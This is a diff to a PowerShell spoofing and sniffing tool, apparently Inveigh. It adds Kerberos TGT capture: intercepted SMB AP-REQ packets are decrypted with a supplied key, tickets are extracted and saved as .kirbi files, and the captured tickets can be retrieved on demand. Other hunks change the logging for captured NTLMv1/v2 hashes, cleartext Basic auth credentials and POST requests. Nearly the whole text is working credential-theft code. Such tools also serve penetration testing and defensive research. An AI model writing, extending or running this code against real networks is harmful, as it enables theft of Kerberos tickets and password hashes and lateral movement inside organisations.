+        $apreq_converted = [System.BitConverter]::ToString($inveigh.kerberos_packet_list[$inveigh.kerberos_index])
+        $apreq_converted = $apreq_converted -replace "-",""
+        $ASN1_index = $apreq_converted.IndexOf("A003020112A1030201")
+
+        if($ASN1_index -ge 0)
+        {
+            $ASN1 = Get-ASN1Length $inveigh.kerberos_packet_list[$inveigh.kerberos_index][($ASN1_index / 2 + 10)..($ASN1_index / 2 + 15)]
+            $ASN1_length = $ASN1[0]
+            $ASN1 = Get-ASN1Length $inveigh.kerberos_packet_list[$inveigh.kerberos_index][($ASN1_index / 2 + $ASN1_length + 10)..($ASN1_index / 2 + $ASN1_length + 15)]
+            $ASN1_length += $ASN1[0]
+            $cipher_length = $ASN1[1]
+            [Byte[]]$cipher = $inveigh.kerberos_packet_list[$inveigh.kerberos_index][($ASN1_index / 2 + $ASN1_length + 10)..($ASN1_index / 2 + $ASN1_length + $cipher_length + 9)]
+            [Byte[]]$ke_key = Get-KerberosAES256UsageKey encrypt 2 $base_key
+            [Byte[]]$cleartext = Unprotect-Kerberos $ke_key $cipher[0..($cipher.Count - 13)]
+            $cleartext = $cleartext[16..$cleartext.Count]
+            $cleartext_converted = [System.BitConverter]::ToString($cleartext)
+            $cleartext_converted = $cleartext_converted -replace "-",""
+            $ASN1_index = $cleartext_converted.IndexOf("A003020112A1")
+
+            if($ASN1_index -ge 0)
+            {
+                [Byte[]]$session_key = $cleartext[30..61]
+                [Byte[]]$ke_key = Get-KerberosAES256UsageKey encrypt 11 $session_key
+                $ASN1_index = $apreq_converted.IndexOf("A003020112A2")
+
+                if($ASN1_index -ge 0)
+                {
+                    $ASN1 = Get-ASN1Length $inveigh.kerberos_packet_list[$inveigh.kerberos_index][($ASN1_index / 2 + 5)..($ASN1_index / 2 + 10)]
+                    $ASN1_length = $ASN1[0]
+                    $ASN1 = Get-ASN1Length $inveigh.kerberos_packet_list[$inveigh.kerberos_index][($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + 10)]
+                    $ASN1_length += $ASN1[0]
+                    $cipher_length = $ASN1[1]
+                    [Byte[]]$cipher = $inveigh.kerberos_packet_list[$inveigh.kerberos_index][($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + $cipher_length + 4)]
+                    [Byte[]]$cleartext = Unprotect-Kerberos $ke_key $cipher[0..($cipher.Count - 13)]
+                    [Byte[]]$ke_key = Get-KerberosAES256UsageKey encrypt 14 $session_key
+                    $cleartext = $cleartext[16..$cleartext.Count]
+                    [Byte[]]$kirbi2 = Get-KirbiPartTwo $cleartext
+                    $ASN1 = Get-ASN1Length $cleartext[4..9]
+                    $ASN1_length = $ASN1[0]
+                    $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + 4)..($ASN1_length + 9)]
+                    $ASN1_length += $ASN1[0]
+                    $realm_length = $cleartext[($ASN1_length + 7)]
+                    $realm = Convert-DataToString 0 $realm_length $cleartext[($ASN1_length + 8)..($ASN1_length + $realm_length + 7)]
+                    $username_length = $cleartext[($ASN1_length + $realm_length + 22)]
+                    $username = Convert-DataToString 0 $username_length $cleartext[($ASN1_length + $realm_length + 23)..($ASN1_length + $realm_length + $username_length + 22)]
+                    $cleartext_converted = [System.BitConverter]::ToString($cleartext)
+                    $cleartext_converted = $cleartext_converted -replace "-",""
+                    $ASN1_index = $cleartext_converted.IndexOf("A003020112A2")
+
+                    if($ASN1_index -ge 0)
+                    {
+                        $ASN1 = Get-ASN1Length $cleartext[($ASN1_index / 2 + 5)..($ASN1_index / 2 + 10)]
+                        $ASN1_length = $ASN1[0]
+                        $ASN1 = Get-ASN1Length $cleartext[($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + 10)]
+                        $ASN1_length += $ASN1[0]
+                        $cipher_length = $ASN1[1]
+                        [Byte[]]$cipher = $cleartext[($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + $cipher_length + 4)]
+                        [Byte[]]$cleartext = Unprotect-Kerberos $ke_key $cipher[0..($cipher.Count - 13)]
+                        $cleartext = $cleartext[16..$cleartext.Count]
+                        [Byte[]]$kirbi3 = Get-KirbiPartThree $cleartext
+                        [Byte[]]$kirbi = Get-Kirbi $kirbi2 $kirbi3
+
+                        if($username -notmatch '[^\x00-\x7F]+' -and $realm -notmatch '[^\x00-\x7F]+')
+                        {
+                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($port) Kerberos TGT captured for $username@$realm from $source_IP`:$source_port") > $null   
+                            $inveigh.kerberos_TGT_list.Add($kirbi) > $null
+                            $inveigh.kerberos_TGT_username_list.Add("$source_IP $username $realm $($inveigh.kerberos_TGT_list.Count - 1)") > $null
+                            $kirbi_count = ($inveigh.kerberos_TGT_username_list -like "* $username $realm *").Count
+                        }
+
+                        if($kirbi_count -le $KerberosCount)
+                        {
+
+                            try
+                            {
+                                $krb_path = $output_directory + "\$username@$realm-TGT-$(Get-Date -format MMddhhmmssffff).kirbi"
+                                $krb_file = New-Object System.IO.FileStream $krb_path,'Append','Write','Read'
+                                $krb_file.Write($kirbi,0,$kirbi.Count)
+                                $krb_file.close()
+                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB($port) Kerberos TGT for $username@$realm written to $krb_path") > $null
+                            }
+                            catch
+                            {
+                                $error_message = $_.Exception.Message
+                                $error_message = $error_message -replace "`n",""
+                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+                            }
+
+                        }
+
+                    }
+                    else
+                    {
+                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SMB($port) Kerberos TGT not found from $source_IP`:$source_port") > $null    
+                    }
+
+                }
+                else
+                {
+                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SMB($port) Kerberos autenticator not found from $source_IP`:$source_port") > $null    
+                }
+
+            }
+            else
+            {
+                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SMB($port) Kerberos failed to decrypt capture from $source_IP`:$source_port") > $null    
+            }
+
+        }
+        else
+        {
+            
+            if($apreq_converted -like "*A0030201??A1030201*")
+            {
+
+                if($apreq_converted -like "*A003020111A1030201*")
+                {
+                    $encryption_type = "AES128-CTS-HMAC-SHA1-96"
+                }
+                elseif($apreq_converted -like "*A003020117A1030201*")
+                {
+                    $encryption_type = "RC4-HMAC"
+                }
+                elseif($apreq_converted -like "*A003020118A1030201*")
+                {
+                    $encryption_type = "RC4-HMAC-EXP"
+                }
+                elseif($apreq_converted -like "*A003020103A1030201*")
+                {
+                    $encryption_type = "DES-CBC-MD5"
+                }
+                elseif($apreq_converted -like "*A003020101A1030201*")
+                {
+                    $encryption_type = "DES-CBC-CRC"
+                }
+
+                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SMB($port) Kerberos unsupported encryption type $encryption_type from $source_IP`:$source_port") > $null
+            }
+            else
+            {
+                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SMB($port) Kerberos failed to extract AS-REQ from $source_IP`:$source_port") > $null 
+            }
+               
         }
 
     }
@@ -2995,6 +3511,7 @@ $HTTP_scriptblock =
             $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
             $HTTP_request_raw_URL = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)
             $HTTP_source_IP = $HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString
+            $HTTP_source_Port = $HTTP_client.Client.RemoteEndpoint.Port
             $HTTP_connection_header_close = $true
 
             if($NBNSBruteForcePause)
@@ -3021,13 +3538,13 @@ $HTTP_scriptblock =
 
             if($HTTP_request_raw_URL_old -ne $HTTP_request_raw_URL -or $HTTP_client_handle_old -ne $HTTP_client.Client.Handle)
             {
-                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP") > $null
-                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP") > $null
-                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent") > $null
+                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) request for $HTTP_request_raw_URL received from $HTTP_source_IP`:$HTTP_source_port") > $null
+                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) host header $HTTP_header_host received from $HTTP_source_IP`:$HTTP_source_port") > $null
+                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) user agent received from $HTTP_source_IP`:$HTTP_source_port`:`n$HTTP_header_user_agent") > $null
 
                 if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))
                 {
-                    $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP") > $null
+                    $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] $HTTP_type($HTTPPort) ignoring wpad.dat request due to user agent from $HTTP_source_IP`:$HTTP_source_port") > $null
                 }
 
             }
@@ -3083,7 +3600,7 @@ $HTTP_scriptblock =
 
                 if($HTTP_POST_request_old -ne $HTTP_POST_request)
                 {
-                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type POST request $HTTP_POST_request captured from $HTTP_source_IP") > $null
+                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) POST request $HTTP_POST_request captured from $HTTP_source_IP`:$HTTP_source_port") > $null
                     $inveigh.POST_request_file_queue.Add($HTTP_POST_request) > $null
                     $inveigh.POST_request_list.Add($HTTP_POST_request) > $null
                 }
@@ -3140,17 +3657,17 @@ $HTTP_scriptblock =
 
                             if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv1 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash") > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv1 challenge/response captured from $HTTP_source_IP`:$HTTP_source_port($HTTP_NTLM_host_string)`:$HTTP_source_port`:`n$HTTP_NTLM_hash") > $null
                             }
                             else
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv1 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_username_full [not unique]") > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv1 challenge/response captured from $HTTP_source_IP`:$HTTP_source_port($HTTP_NTLM_host_string)`:$HTTP_source_port`:`n$HTTP_username_full [not unique]") > $null
                             }
 
                             if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                             {
                                 $inveigh.NTLMv1_file_queue.Add($HTTP_NTLM_hash) > $null
-                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file) > $null
+                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file) > $null
                             }
 
                             if($inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
@@ -3173,17 +3690,17 @@ $HTTP_scriptblock =
 
                             if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash") > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string)`:$HTTP_source_port`:`n$HTTP_NTLM_hash") > $null
                             }
                             else
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_username_full [not unique]") > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string)`:$HTTP_source_port`:`n$HTTP_username_full [not unique]") > $null
                             }
 
                             if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                             {
                                 $inveigh.NTLMv2_file_queue.Add($HTTP_NTLM_hash) > $null
-                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file) > $null
+                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file) > $null
                             }
 
                             if($inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
@@ -3240,11 +3757,11 @@ $HTTP_scriptblock =
                 $HTTP_client_close = $true
                 $inveigh.cleartext_file_queue.Add($cleartext_credentials) > $null
                 $inveigh.cleartext_list.Add($cleartext_credentials) > $null
-                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type Basic auth cleartext credentials $cleartext_credentials captured from $HTTP_source_IP") > $null
+                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) Basic auth cleartext credentials $cleartext_credentials captured from $HTTP_source_IP`:$HTTP_source_port") > $null
 
                 if($inveigh.file_output)
                 {
-                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type Basic auth cleartext credentials written to " + $inveigh.cleartext_out_file) > $null
+                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type($HTTPPort) Basic auth cleartext credentials written to " + $inveigh.cleartext_out_file) > $null
                 }
                  
             }
@@ -3425,11 +3942,12 @@ $HTTP_scriptblock =
 # Sniffer/Spoofer ScriptBlock - LLMNR/NBNS Spoofer and SMB sniffer
 $sniffer_scriptblock = 
 {
-    param ($EvadeRG,$IP,$LLMNR,$LLMNR_response_message,$LLMNRTTL,$mDNS,$mDNS_response_message,$mDNSTypes,$mDNSTTL,
-            $NBNS,$NBNS_response_message,$NBNSTTL,$NBNSTypes,$output_directory,$PcapOutput,$PcapPortTCP,
-            $PcapPortUDP,$SMB,$SpooferHostsIgnore,$SpooferHostsReply,$SpooferIP,$SpooferIPsIgnore,
-            $SpooferIPsReply,$SpooferLearning,$SpooferLearningDelay,$SpooferLearningInterval,$SpooferNonprintable,
-            $SpooferThresholdHost,$SpooferThresholdNetwork)
+    param ($EvadeRG,$IP,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$LLMNR,$LLMNR_response_message,
+            $LLMNRTTL,$mDNS,$mDNS_response_message,$mDNSTypes,$mDNSTTL,$NBNS,$NBNS_response_message,$NBNSTTL,
+            $NBNSTypes,$output_directory,$PcapOutput,$PcapPortTCP,$PcapPortUDP,$SMB,$SpooferHostsIgnore,
+            $SpooferHostsReply,$SpooferIP,$SpooferIPsIgnore,$SpooferIPsReply,$SpooferLearning,
+            $SpooferLearningDelay,$SpooferLearningInterval,$SpooferNonprintable,$SpooferThresholdHost,
+            $SpooferThresholdNetwork)
 
     $sniffer_running = $true
     $byte_in = New-Object System.Byte[] 4	
@@ -3442,6 +3960,21 @@ $sniffer_scriptblock =
     $sniffer_socket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
     $sniffer_socket.SetSocketOption("IP","HeaderIncluded",$true)
     $sniffer_socket.ReceiveBufferSize = 65534
+
+    if($Kerberos -eq 'Y')
+    {
+
+        if($KerberosHash)
+        {
+            $kerberos_base_key = (&{for ($i = 0;$i -lt $KerberosHash.Length;$i += 2){$KerberosHash.SubString($i,2)}}) -join "-"
+            $kerberos_base_key = $inveigh.kerberos_base_key.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+        }
+        elseif($KerberosCredential)
+        {
+            $kerberos_base_key = Get-KerberosAES256BaseKey ($KerberosCredential.UserName).Trim("\") $KerberosCredential.Password
+        }
+
+    }
 
     try
     {
@@ -3557,13 +4090,28 @@ $sniffer_scriptblock =
 
                     445
                     {
-                     
+
                         if($SMB -eq 'Y')
                         {
 
-                            if($payload_bytes)
+                            if($inveigh.kerberos_packet_list[$inveigh.kerberos_index].Count -lt $kerberos_length -and "$source_IP`:$source_port" -eq $kerberos_source)
                             {
-                                Get-SMBConnection $payload_bytes $source_IP $source_port "445"
+                                $inveigh.kerberos_packet_list[$inveigh.kerberos_index] += $payload_bytes
+
+                                if($inveigh.kerberos_packet_list[$inveigh.kerberos_index].Count -ge $kerberos_length)
+                                {
+                                    New-KerberosKirbi $kerberos_base_key 445
+                                    $inveigh.kerberos_index = $inveigh.kerberos_packet_list.Count
+                                    $kerberos_length = $null
+                                    $kerberos_source = $null
+                                }
+
+                            }
+
+                            if($payload_bytes)
+                            {   
+                                $kerberos_length = Get-SMBConnection $payload_bytes $source_IP $source_port "445"
+                                $kerberos_source = "$source_IP`:$source_port"
                             }
 
                             if($inveigh.SMB_session_table."$source_IP`:$source_port")
@@ -4989,10 +5537,11 @@ function SnifferSpoofer
     $sniffer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
     $sniffer_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
     $sniffer_powershell.AddScript($sniffer_scriptblock).AddArgument($EvadeRG).AddArgument($IP).AddArgument(
-        $LLMNR).AddArgument($LLMNR_response_message).AddArgument($LLMNRTTL).AddArgument($mDNS).AddArgument(
-        $mDNS_response_message).AddArgument($mDNSTypes).AddArgument($mDNSTTL).AddArgument($NBNS).AddArgument(
-        $NBNS_response_message).AddArgument($NBNSTTL).AddArgument($NBNSTypes).AddArgument(
-        $output_directory).AddArgument($PcapOutput).AddArgument($PcapPortTCP).AddArgument(
+        $Kerberos).AddArgument($KerberosCount).AddArgument($KerberosCredential).AddArgument(
+        $KerberosHash).AddArgument($LLMNR).AddArgument($LLMNR_response_message).AddArgument(
+        $LLMNRTTL).AddArgument($mDNS).AddArgument($mDNS_response_message).AddArgument($mDNSTypes).AddArgument(
+        $mDNSTTL).AddArgument($NBNS).AddArgument($NBNS_response_message).AddArgument($NBNSTTL).AddArgument(
+        $NBNSTypes).AddArgument($output_directory).AddArgument($PcapOutput).AddArgument($PcapPortTCP).AddArgument(
         $PcapPortUDP).AddArgument($SMB).AddArgument($SpooferHostsIgnore).AddArgument(
         $SpooferHostsReply).AddArgument($SpooferIP).AddArgument($SpooferIPsIgnore).AddArgument(
         $SpooferIPsReply).AddArgument($SpooferLearning).AddArgument($SpooferLearningDelay).AddArgument(
@@ -5429,17 +5978,23 @@ Get added DNS host records.
 .PARAMETER ADIDNSFailed
 Get failed DNS host record adds.
 
-.PARAMETER Learning
-Get valid hosts discovered through spoofer learning.
-
-.PARAMETER Log
-Get log entries.
-
 .PARAMETER Cleartext
 Get captured cleartext credentials.
 
 .PARAMETER CleartextUnique
 Get unique captured cleartext credentials.
+
+.PARAMETER KerberosUsername
+Get IP addresses, usernames, and index for captured Kerberos TGTs.
+
+.PARAMETER KerberosTGT
+Get Kerberos TGT kirbi byte array by index.
+
+.PARAMETER Learning
+Get valid hosts discovered through spoofer learning.
+
+.PARAMETER Log
+Get log entries.
 
 .PARAMETER NTLMv1
 Get captured NTLMv1 challenge/response hashes.
@@ -5477,6 +6032,8 @@ Get relay session list.
         [parameter(Mandatory=$false)][Switch]$Console,
         [parameter(Mandatory=$false)][Switch]$ADIDNS,
         [parameter(Mandatory=$false)][Switch]$ADIDNSFailed,
+        [parameter(Mandatory=$false)][Int]$KerberosTGT,
+        [parameter(Mandatory=$false)][Switch]$KerberosUsername,
         [parameter(Mandatory=$false)][Switch]$Learning,
         [parameter(Mandatory=$false)][Switch]$Log,
         [parameter(Mandatory=$false)][Switch]$NTLMv1,
@@ -5560,6 +6117,16 @@ Get relay session list.
 
         }
 
+    }
+
+    if($KerberosTGT)
+    {
+        Write-Output $inveigh.kerberos_TGT_list[$KerberosTGT]
+    }
+
+    if($KerberosUsername)
+    {
+        Write-Output $inveigh.kerberos_TGT_username_list
     }
 
     if($Log)
